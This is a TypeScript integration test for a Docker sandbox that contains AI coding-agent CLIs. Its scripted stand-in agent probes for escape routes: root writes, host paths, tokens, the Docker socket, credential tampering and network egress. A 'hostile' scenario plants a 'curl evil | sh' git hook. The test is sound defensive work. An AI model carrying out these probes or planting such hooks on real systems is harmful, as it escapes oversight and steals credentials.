import { chmod, mkdir, readFile, stat, writeFile } from "node:fs/promises";
import { homedir } from "node:os";
import path from "node:path";
import { afterAll, beforeAll, describe, expect, it } from "vitest";

import { createAgentProcess } from "../agents/agent.process";
import { createReplayRunner } from "../agents/agent.replay";
import { deskConfigSchema } from "../contracts";
import { diffAgainstBase } from "../git";
import { createExec } from "../ports";
import { checkContainer, dockerRunArgs, proxyContainer } from "./docker.args";
import { containerBase } from "./docker.context";
import { buildImage, inspectImage, readImageContext } from "./docker.image";
import { allFilters, resourceLabels, socketVolume } from "./docker.names";
import { runIsolationProbes, runProbe } from "./docker.probe";
import { withProxy } from "./docker.proxy";
import { createDockerIsolation, type DockerIsolation } from "./isolation.docker";
import { baseRequest } from "../testing/agent.testing";
import { createScratch, hermeticExec, type TestRepo, type TestScratch } from "../testing/git.repo";

/**
 * Real Docker. Skipped unless DESK_DOCKER=1, so CI and `pnpm check` stay Docker-free.
 *
 *   DESK_DOCKER=1 pnpm --filter @repo/desk exec vitest run src/isolation/docker.integration.test.ts
 *
 * It builds the worker image if needed, runs the isolation probes in real containers, runs
 * a scripted stand-in for the builder (a Node script, no model, no login), checks that its
 * edits come back as a guarded patch, and removes every labelled resource it made. It needs
 * the network once: `pnpm fetch` of one tiny package through the registry-only proxy.
 */

const enabled = process.env.DESK_DOCKER === "1";
const exec = createExec({ maxOutputBytes: 64 * 1024 * 1024 });

const FAKE_AGENT = `#!/usr/bin/env node
import { execFileSync } from "node:child_process";
import { createRequire } from "node:module";
import { existsSync, readFileSync, readdirSync, writeFileSync, mkdirSync, rmSync } from "node:fs";
import net from "node:net";
import process from "node:process";

// A stand-in for the builder. It runs where the real builder would: in the agent container.
const scenario = readFileSync("/workspace/scenario.txt", "utf8").trim();
const observations = {};
const attempt = (name, action) => {
  try {
    observations[name] = action();
  } catch (error) {
    observations[name] = "error: " + (error && error.code ? error.code : "failed");
  }
};

attempt("uid", () => process.getuid());
attempt("cwd", () => process.cwd());
attempt("isNumber", () => createRequire("/workspace/package.json")("is-number")(5));
attempt("rootWrite", () => {
  writeFileSync("/etc/desk-agent", "x");
  return "WROTE";
});
attempt("hostHome", () => existsSync("/Users") || existsSync("/home/" + "ognjenmarceta"));
attempt("ghToken", () => Boolean(process.env.GH_TOKEN || process.env.GITHUB_TOKEN));
attempt("dockerSocket", () => existsSync("/var/run/docker.sock"));
attempt("claudeConfig", () => process.env.CLAUDE_CONFIG_DIR);
attempt("seededToken", () => {
  const file = process.env.CLAUDE_CONFIG_DIR + "/.credentials.json";
  return existsSync(file) ? JSON.parse(readFileSync(file, "utf8")).claudeAiOauth.accessToken : null;
});
attempt("auth", () => readdirSync("/auth").join(","));
attempt("authWrite", () => {
  writeFileSync("/auth/.credentials.json", "tamper");
  return "WROTE";
});

const connect = (host, port) =>
  new Promise((resolve) => {
    const socket = net.connect({ host, port });
    socket.setTimeout(3000, () => { socket.destroy(); resolve("timeout"); });
    socket.once("connect", () => { socket.destroy(); resolve("CONNECTED"); });
    socket.once("error", (error) => resolve(error.code ?? "error"));
  });
observations.directEgress = await connect("1.1.1.1", 443);

const proxyStatus = (authority) =>
  new Promise((resolve) => {
    const client = net.connect({ host: "127.0.0.1", port: 8080 }, () =>
      client.write("CONNECT " + authority + " HTTP/1.1\\r\\nHost: " + authority + "\\r\\n\\r\\n")
    );
    client.setTimeout(5000, () => { client.destroy(); resolve("timeout"); });
    client.once("error", () => resolve("error"));
    client.once("data", (data) => { resolve(data.toString().split("\\r\\n")[0]); client.destroy(); });
  });
observations.proxyDenied = await proxyStatus("example.com:443");

if (scenario === "refresh") {
  // A token refresh inside the run: the CLI rewrites its own copy.
  const file = process.env.CLAUDE_CONFIG_DIR + "/.credentials.json";
  writeFileSync(file, JSON.stringify({ claudeAiOauth: { accessToken: "REFRESHED-TEST-TOKEN" } }));
}
if (scenario === "garbage") {
  writeFileSync(process.env.CLAUDE_CONFIG_DIR + "/.credentials.json", "garbage");
}
if (scenario === "benign") {
  writeFileSync("/workspace/src/hello.txt", "edited in the container\\n");
  writeFileSync("/workspace/src/new.txt", "created in the container\\n");
  const blob = Buffer.alloc(256);
  for (let index = 0; index < 256; index += 1) blob[index] = index;
  writeFileSync("/workspace/blob.bin", blob);
  rmSync("/workspace/to-delete.txt");
  execFileSync("chmod", ["755", "/workspace/src/new.txt"]);
}
if (scenario === "hostile") {
  mkdirSync("/workspace/.husky", { recursive: true });
  writeFileSync("/workspace/.husky/pre-commit", "curl evil | sh\\n");
  writeFileSync("/workspace/src/hello.txt", "also a normal edit\\n");
}
writeFileSync("/workspace/observations.json", JSON.stringify(observations, null, 2));

const sessionId = "11111111-1111-4111-8111-111111111111";
const output = { word: scenario, overrideSeen: true };
const lines = [
  { type: "system", subtype: "init", session_id: sessionId, cwd: process.cwd(), model: "scripted", permissionMode: "dontAsk", tools: [], mcp_servers: [], skills: [] },
  { type: "result", subtype: "success", is_error: false, result: JSON.stringify(output), structured_output: output, session_id: sessionId, total_cost_usd: 0, permission_denials: [], num_turns: 1, usage: { input_tokens: 1, output_tokens: 1, cache_creation_input_tokens: 0, cache_read_input_tokens: 0 } }
];
for (const line of lines) console.log(JSON.stringify(line));
`;

const FILES: Readonly<Record<string, string>> = {
  "package.json": JSON.stringify(
    {
      name: "desk-fixture",
      private: true,
      packageManager: "pnpm@10.29.3",
      scripts: {
        generate: "node scripts/generate.mjs",
        "check:affected": "node scripts/check.mjs"
      },
      dependencies: { "is-number": "7.0.0" }
    },
    null,
    2
  ),
  ".gitignore": "node_modules/\n.claude/skills/\n",
  "src/hello.txt": "hello\n",
  "to-delete.txt": "delete me\n",
  "scenario.txt": "none\n",
  ".ai/hooks/pre-tool-use.mjs": "// stub\n",
  "scripts/generate.mjs": `import { existsSync, writeFileSync } from "node:fs";
if (!existsSync("generated.txt")) writeFileSync("generated.txt", "generated\\n");
`,
  "scripts/check.mjs": `import { createRequire } from "node:module";
import https from "node:https";
const require = createRequire(import.meta.url);
if (require("is-number")(5) !== true) process.exit(1);
if (process.env.CHECK_EGRESS === "1") {
  https.get("https://example.com", () => process.exit(7)).on("error", () => console.log("no egress"));
}
console.log("checks passed");
`
};

interface World {
  readonly scratch: TestScratch;
  readonly repo: TestRepo;
  readonly baseSha: string;
  readonly isolation: DockerIsolation;
  readonly tag: string;
  readonly artifacts: string;
  /** Machine-wide login volumes that existed before this run. The run never removes those. */
  readonly authBefore: ReadonlySet<string>;
}

let world: World | null = null;
const must = (): World => {
  if (world === null) throw new Error("the Docker world is not ready");
  return world;
};

const labelled = async (kind: "ps" | "volume" | "network"): Promise<string[]> => {
  const args =
    kind === "ps"
      ? ["ps", "-a", "--filter", "label=kaine-desk=1", "--format", "{{.Names}}"]
      : [
          kind,
          "ls",
          "--filter",
          "label=kaine-desk=1",
          "--format",
          kind === "volume" ? "{{.Name}}" : "{{.Name}}"
        ];
  const result = await exec({ argv: ["docker", ...args], timeoutMs: 60_000 });
  return result.stdout.split("\n").filter((line) => line.trim() !== "");
};

/** Timings and probe results. Written to DESK_DOCKER_REPORT when that variable is set. */
const notes: string[] = [];
const timed = async <T>(label: string, action: () => Promise<T>): Promise<T> => {
  const started = Date.now();
  try {
    return await action();
  } finally {
    notes.push(`time  ${label}: ${((Date.now() - started) / 1000).toFixed(1)} s`);
  }
};

const runScenario = async (scenario: string) => {
  const w = must();
  await writeFile(path.join(w.repo.dir, "scenario.txt"), `${scenario}\n`);
  const runner = w.isolation.runnerFor({
    role: "builder",
    provider: "claude",
    issue: 9001,
    worktree: w.repo.dir,
    baseSha: w.baseSha,
    artifactsDir: w.artifacts
  });
  return runner.run(
    baseRequest({
      role: "builder",
      cwd: w.repo.dir,
      receiptsPath: path.join(w.artifacts, "receipts-builder.jsonl"),
      timeoutMs: 120_000
    })
  );
};

/** `git status --porcelain` lines. The helper `repo.git` trims, which would eat a leading space. */
const gitStatus = async (repo: TestRepo): Promise<string[]> => {
  const result = await hermeticExec({ argv: ["git", "status", "--porcelain"], cwd: repo.dir });
  return result.stdout.split("\n").filter((line) => line !== "");
};

const observed = async (repo: TestRepo): Promise<Record<string, unknown>> =>
  JSON.parse(await readFile(path.join(repo.dir, "observations.json"), "utf8"));

describe.skipIf(!enabled)("Docker isolation (real Docker, DESK_DOCKER=1)", () => {
  beforeAll(async () => {
    const before = [...(await labelled("ps")), ...(await labelled("volume"))];
    const authBefore = new Set(before.filter((name) => name.startsWith("kaine-desk-auth-")));
    const scratch = await createScratch();
    const repo = await scratch.repo("fixture");
    for (const [file, content] of Object.entries(FILES)) await repo.write(file, content);
    await repo.write("fake-claude.mjs", FAKE_AGENT);
    await chmod(path.join(repo.dir, "fake-claude.mjs"), 0o755);
    // The lockfile comes from the host's pnpm; the container installs from it offline.
    const lock = await exec({
      argv: ["pnpm", "install", "--lockfile-only", "--ignore-scripts"],
      cwd: repo.dir,
      timeoutMs: 180_000
    });
    if (lock.code !== 0) throw new Error(`could not create the fixture lockfile: ${lock.stderr}`);
    await repo.commit("fixture");
    const baseSha = await repo.git(["rev-parse", "HEAD"]);

    const context = await readImageContext(path.resolve(import.meta.dirname, "../../../.."));
    const state = await inspectImage(exec, context.tag);
    if (state.status !== "current") {
      const built = await timed("image build", () => buildImage(exec, context));
      if (!built.ok) throw new Error(built.reason);
    }
    const isolation = createDockerIsolation({
      exec,
      process: createAgentProcess(),
      hostRunnerFor: () => createReplayRunner([]),
      repoRoot: repo.dir,
      stateRoot: path.join(scratch.root, "state"),
      config: deskConfigSchema.parse({
        docker: { agent: { memory: "2g", cpus: 2 }, check: { memory: "2g", cpus: 2 } }
      }),
      imageTag: context.tag,
      binaries: { claude: "/workspace/fake-claude.mjs" }
    });
    const artifacts = path.join(scratch.root, "artifacts");
    await mkdir(artifacts, { recursive: true });
    world = { scratch, repo, baseSha, isolation, tag: context.tag, artifacts, authBefore };
  }, 900_000);

  afterAll(async () => {
    const w = world;
    try {
      if (w !== null) {
        await w.isolation.removeIssue(9001);
        // The auth volumes are machine-wide. Remove only those that this run created.
        for (const provider of ["claude", "codex"]) {
          const name = `kaine-desk-auth-${provider}`;
          if (w.authBefore.has(name)) continue;
          await exec({ argv: ["docker", "volume", "rm", name], timeoutMs: 60_000 });
        }
      }
    } finally {
      await w?.scratch.cleanup();
      // Vitest hides console output of a passing run, so a report file is the way to read it.
      if (process.env.DESK_DOCKER_REPORT !== undefined) {
        await writeFile(process.env.DESK_DOCKER_REPORT, `${notes.join("\n")}\n`);
      }
    }
  }, 300_000);

  it("has the pinned CLIs in the image", async () => {
    const w = must();
    const version = (program: string) =>
      exec({
        argv: [
          "docker",
          "run",
          "--rm",
          "--label",
          "kaine-desk=1",
          "--name",
          `kaine-desk-test-version-${program}`,
          "--network",
          "none",
          "--read-only",
          "--tmpfs",
          "/home/desk:rw,uid=1000,gid=1000",
          "--entrypoint",
          program,
          w.tag,
          "--version"
        ],
        timeoutMs: 60_000
      });
    expect((await version("claude")).stdout).toContain("2.1.282");
    expect((await version("codex")).stdout).toContain("0.147.0");
    expect((await version("pnpm")).stdout.trim()).toBe("10.29.3");
    const image = await inspectImage(exec, w.tag);
    expect(image).toMatchObject({ status: "current" });
  }, 120_000);

  it("passes every isolation probe in a throwaway container from the real image", async () => {
    const w = must();
    const context = await w.isolation.machineContext();
    const report = await timed("probes (real providers policy)", () =>
      runIsolationProbes(context, [homedir(), w.repo.dir, w.scratch.root])
    );

    for (const entry of report.checks) {
      notes.push(`probe ${entry.ok ? "ok  " : "FAIL"} ${entry.id}: ${entry.detail}`);
    }
    expect(report.checks.filter((entry) => !entry.ok)).toEqual([]);
    expect(report.checks.map((entry) => entry.id)).toEqual(
      expect.arrayContaining([
        "network-interfaces",
        "no-egress",
        "no-credentials-in-env",
        "no-docker-socket",
        "root-filesystem-read-only",
        "non-root",
        "capabilities-empty",
        "no-new-privileges",
        "host-paths-invisible",
        "resource-limits",
        "proxy-allowlist"
      ])
    );
  }, 180_000);

  it("lets only the allowlisted host through a proxy socket (local test proxy, not a provider)", async () => {
    const w = must();
    const context = await w.isolation.machineContext();
    const runId = context.newId();
    const socket = socketVolume(null, runId);
    const base = containerBase(context, "proxy", runId, context.limits.proxy);
    await context.docker.ensureVolume(socket, resourceLabels(null, "sock", runId));
    try {
      // The same proxy code as the real one, with a test policy and a local echo as the upstream.
      const script = `
        import net from "node:net";
        import { createProxyServer, listenOnSocket } from "/opt/desk/desk-proxy.mjs";
        const echo = net.createServer((s) => s.pipe(s));
        await new Promise((r) => echo.listen(9443, "127.0.0.1", r));
        listenOnSocket(createProxyServer({
          isAllowed: (authority) => authority === "allowed.test:443",
          connect: () => net.connect(9443, "127.0.0.1")
        }), "/socket/provider.sock");
      `;
      const spec = proxyContainer({ ...base, mode: "providers", socketVolume: socket });
      await context.docker.ok(
        dockerRunArgs({ ...spec, command: ["--input-type=module", "-e", script] })
      );
      for (let attempt = 0; attempt < 50; attempt += 1) {
        const ready = await context.docker.run([
          "exec",
          base.name,
          "test",
          "-S",
          "/socket/provider.sock"
        ]);
        if (ready.code === 0) break;
        await new Promise((resolve) => setTimeout(resolve, 100));
      }
      const report = await runProbe(context, {
        hostPaths: [],
        proxy: {
          socketVolume: socket,
          allowed: ["allowed.test"],
          denied: ["example.com", "registry.npmjs.org"]
        }
      });
      const proxyCheck = report.checks.find((entry) => entry.id === "proxy-allowlist");
      expect(proxyCheck).toMatchObject({ ok: true });
      expect(proxyCheck?.detail).toContain("2 denied host(s) get 403, 1 allowed host(s) get 200");
    } finally {
      await context.docker.removeContainers([...allFilters(), `label=kaine-desk.run=${runId}`]);
      await context.docker.removeVolumes([...allFilters(), `label=kaine-desk.run=${runId}`]);
    }
  }, 120_000);

  it("gives the dependency proxy the npm registry and nothing else", async () => {
    const w = must();
    const context = await w.isolation.machineContext();
    const report = await withProxy(context, "dependencies", (socketVolume_) =>
      runProbe(context, {
        hostPaths: [],
        proxy: {
          socketVolume: socketVolume_,
          allowed: ["registry.npmjs.org"],
          denied: ["example.com", "api.anthropic.com", "chatgpt.com", "github.com"]
        }
      })
    );
    expect(report.checks.find((entry) => entry.id === "proxy-allowlist")).toMatchObject({
      ok: true
    });
  }, 120_000);

  it("round-trips a scripted builder's edits to the host worktree as a guarded patch", async () => {
    const w = must();
    const refsBefore = await w.repo.git(["for-each-ref"]);
    const configBefore = await readFile(path.join(w.repo.dir, ".git", "config"), "utf8");

    const outcome = await timed("builder run (import, fetch, install, run, export)", () =>
      runScenario("benign")
    );
    if (!outcome.ok) throw new Error(JSON.stringify(outcome.failure));
    expect(outcome.result.structured).toEqual({ word: "benign", overrideSeen: true });

    // The edits came back, byte for byte.
    expect(await readFile(path.join(w.repo.dir, "src/hello.txt"), "utf8")).toBe(
      "edited in the container\n"
    );
    expect(await readFile(path.join(w.repo.dir, "src/new.txt"), "utf8")).toBe(
      "created in the container\n"
    );
    const blob = await readFile(path.join(w.repo.dir, "blob.bin"));
    expect([...blob]).toEqual(Array.from({ length: 256 }, (_unused, index) => index));
    await expect(readFile(path.join(w.repo.dir, "to-delete.txt"))).rejects.toThrow();
    const status = await gitStatus(w.repo);
    expect(status.sort()).toEqual(
      [
        " D to-delete.txt",
        " M scenario.txt",
        " M src/hello.txt",
        "?? blob.bin",
        "?? observations.json",
        "?? src/new.txt"
      ].sort()
    );
    // The engine's own invariants still hold: nothing moved in the host repository.
    expect(await w.repo.git(["for-each-ref"])).toBe(refsBefore);
    expect(await readFile(path.join(w.repo.dir, ".git", "config"), "utf8")).toBe(configBefore);
    expect(await w.repo.git(["rev-parse", "HEAD"])).toBe(w.baseSha);
    // No dependency, no ignored file, no agent file crossed over.
    expect(status.some((line) => line.includes("node_modules") || line.includes(".claude"))).toBe(
      false
    );
    // The mode bit crossed over too.
    expect((await stat(path.join(w.repo.dir, "src/new.txt"))).mode & 0o111).toBeGreaterThan(0);

    // What the agent saw inside the container.
    const seen = await observed(w.repo);
    expect(seen.uid).toBe(1000);
    expect(seen.cwd).toBe("/workspace");
    expect(seen.isNumber).toBe(true);
    expect(String(seen.rootWrite)).toContain("error");
    expect(seen.hostHome).toBe(false);
    expect(seen.ghToken).toBe(false);
    expect(seen.dockerSocket).toBe(false);
    expect(seen.directEgress).not.toBe("CONNECTED");
    expect(seen.proxyDenied).toContain("403");
    expect(String(seen.authWrite)).toContain("error");
    expect(seen.claudeConfig).toBe("/state/claude");

    // Receipts were exported (an empty file is fine: the scripted agent calls no tool).
    const diff = await diffAgainstBase(hermeticExec, w.repo.dir, w.baseSha);
    expect(diff.files.length).toBe(6);
    expect(await labelled("ps")).toEqual([]);
  }, 600_000);

  it("refuses a hostile patch and leaves the host worktree as it was", async () => {
    const w = must();
    // Start from a clean host worktree.
    await w.repo.git(["reset", "--quiet", "--hard"]);
    await w.repo.git(["clean", "--quiet", "-fd"]);
    const outcome = await timed("hostile builder run", () => runScenario("hostile"));
    expect(outcome.ok).toBe(false);
    expect(outcome.ok ? "" : JSON.stringify(outcome.failure)).toContain("Protected path");
    // Only the scenario file the test itself wrote is different.
    expect(await gitStatus(w.repo)).toEqual([" M scenario.txt"]);
    await expect(readFile(path.join(w.repo.dir, ".husky/pre-commit"))).rejects.toThrow();
  }, 600_000);

  it("copies a login into the run, takes a refreshed token back, and rejects garbage", async () => {
    const w = must();
    if (w.authBefore.has("kaine-desk-auth-claude")) return; // a real login exists: never touch it
    const context = await w.isolation.machineContext();
    const seed = async (token: string) => {
      const result = await context.docker.run(
        [
          "run",
          "--rm",
          "--label",
          "kaine-desk=1",
          "--name",
          `kaine-desk-test-seed-${context.newId()}`,
          "--network",
          "none",
          "--user",
          "1000:1000",
          "--mount",
          "type=volume,src=kaine-desk-auth-claude,dst=/auth",
          "--entrypoint",
          "node",
          w.tag,
          "-e",
          `require("fs").writeFileSync("/auth/.credentials.json", JSON.stringify({claudeAiOauth:{accessToken:${JSON.stringify(token)}}}))`
        ],
        { timeoutMs: 60_000 }
      );
      expect(result.code).toBe(0);
    };
    const readAuth = async (): Promise<string> => {
      const result = await context.docker.run(
        [
          "run",
          "--rm",
          "--label",
          "kaine-desk=1",
          "--name",
          `kaine-desk-test-read-${context.newId()}`,
          "--network",
          "none",
          "--user",
          "1000:1000",
          "--mount",
          "type=volume,src=kaine-desk-auth-claude,dst=/auth,readonly",
          "--entrypoint",
          "cat",
          w.tag,
          "/auth/.credentials.json"
        ],
        { timeoutMs: 60_000 }
      );
      return result.stdout;
    };
    await context.docker.ensureVolume("kaine-desk-auth-claude", resourceLabels(null, "auth"));
    await seed("TEST-TOKEN-NOT-REAL");

    await w.repo.git(["reset", "--quiet", "--hard"]);
    await w.repo.git(["clean", "--quiet", "-fd"]);
    const refreshed = await runScenario("refresh");
    expect(refreshed.ok).toBe(true);
    expect((await observed(w.repo)).seededToken).toBe("TEST-TOKEN-NOT-REAL");
    expect(await readAuth()).toContain("REFRESHED-TEST-TOKEN");

    await w.repo.git(["reset", "--quiet", "--hard"]);
    await w.repo.git(["clean", "--quiet", "-fd"]);
    await seed("TEST-TOKEN-NOT-REAL");
    const garbage = await runScenario("garbage");
    expect(garbage.ok).toBe(true);
    expect(await readAuth()).toContain("TEST-TOKEN-NOT-REAL");
  }, 600_000);

  it("starts the real Claude and Codex CLIs in the container and stops at a missing login", async () => {
    const w = must();
    if (w.authBefore.size > 0) return; // a real login exists: this test must not use it
    const real = createDockerIsolation({
      exec,
      process: createAgentProcess(),
      hostRunnerFor: () => createReplayRunner([]),
      repoRoot: w.repo.dir,
      stateRoot: path.join(w.scratch.root, "state"),
      config: deskConfigSchema.parse({ docker: { agent: { memory: "2g", cpus: 2 } } }),
      imageTag: w.tag
    });
    await w.repo.git(["reset", "--quiet", "--hard"]);
    await w.repo.git(["clean", "--quiet", "-fd"]);
    for (const provider of ["claude", "codex"] as const) {
      const outcome = await timed(`real ${provider} CLI without a login`, () =>
        real
          .runnerFor({
            role: "builder",
            provider,
            issue: 9001,
            worktree: w.repo.dir,
            baseSha: w.baseSha,
            artifactsDir: w.artifacts
          })
          .run(
            baseRequest({
              role: "builder",
              provider,
              cwd: w.repo.dir,
              permissions: { allow: ["Read"], disallow: ["WebFetch"] },
              timeoutMs: 90_000
            })
          )
      );
      // No model ran: the auth volume holds no login. Claude stops before any request. Codex
      // sends one request without credentials through the providers proxy and gets a 401. The
      // flags of both CLIs were accepted, because each got as far as authentication.
      expect(outcome.ok).toBe(false);
      const message = outcome.ok ? "" : JSON.stringify(outcome.failure);
      notes.push(`cli   ${provider} without a login: ${message.slice(0, 200)}`);
      expect(message).toMatch(provider === "claude" ? /Not logged in/ : /401|Unauthorized|login/i);
      expect(message).toContain(`pnpm desk docker login --provider ${provider}`);
    }
  }, 300_000);

  it("runs the check steps in containers: drift is found, the fix comes back, the second round passes", async () => {
    const w = must();
    await w.repo.git(["reset", "--quiet", "--hard"]);
    await w.repo.git(["clean", "--quiet", "-fd"]);
    const request = {
      issue: 9001,
      worktree: w.repo.dir,
      kind: "loop" as const,
      config: deskConfigSchema.parse({ checks: { loop: [["pnpm", "check:affected"]] } }),
      exec,
      baseSha: w.baseSha,
      artifactsDir: path.join(w.artifacts, "check")
    };

    // `pnpm generate` writes generated.txt on its first run: that is drift.
    const first = await timed("check round 1 (drift)", () => w.isolation.runChecks(request));
    expect(first.passed).toBe(false);
    expect(first.generatedDrift).toBe(true);
    expect(await readFile(path.join(w.repo.dir, "generated.txt"), "utf8")).toBe("generated\n");

    const second = await timed("check round 2 (pass)", () => w.isolation.runChecks(request));
    expect(second.passed).toBe(true);
    expect(second.steps.map((step) => step.argv.join(" "))).toEqual([
      "pnpm generate",
      "pnpm check:affected"
    ]);
    expect(second.steps[1]?.tail).toContain("checks passed");
    // The report's hash is the host worktree's hash.
    expect(second.diffHash).toBe(
      (await diffAgainstBase(hermeticExec, w.repo.dir, w.baseSha)).diffHash
    );
    expect(await labelled("ps")).toEqual([]);
  }, 600_000);

  it("gives a check step no network at all", async () => {
    const w = must();
    const context = await w.isolation.contextFor(9001);
    const spec = checkContainer({
      ...containerBase(context, "check", context.newId(), context.limits.check),
      workspaceVolume: `kaine-desk-${w.isolation.scopeOf(9001).repoKey}-9001-ws`,
      argv: [
        "node",
        "-e",
        "require('dns').resolve4('example.com', (e) => process.exit(e ? 0 : 9))"
      ],
      env: {}
    });
    const result = await context.docker.run(dockerRunArgs(spec), { timeoutMs: 60_000 });
    expect(result.code).toBe(0);
  }, 120_000);

  it("removes every container, volume and network of the issue, and verifies it", async () => {
    const w = must();
    const note = await timed("removeIssue", () => w.isolation.removeIssue(9001));
    expect(note).toMatch(/volume/);
    const key = w.isolation.scopeOf(9001).repoKey;
    for (const kind of ["ps", "volume"] as const) {
      const result = await exec({
        argv: [
          "docker",
          ...(kind === "ps" ? ["ps", "-a"] : ["volume", "ls"]),
          "--filter",
          `label=kaine-desk.repo=${key}`,
          "-q"
        ],
        timeoutMs: 60_000
      });
      expect(result.stdout.trim()).toBe("");
    }
    // Nothing of this test run is left, except the machine-wide login volume (removed in afterAll).
    expect(await labelled("ps")).toEqual([]);
    expect(await labelled("network")).toEqual([]);
    const leftover = (await labelled("volume")).filter(
      (name) => !w.authBefore.has(name) && !name.startsWith("kaine-desk-auth-")
    );
    expect(leftover).toEqual([]);
  }, 180_000);
});
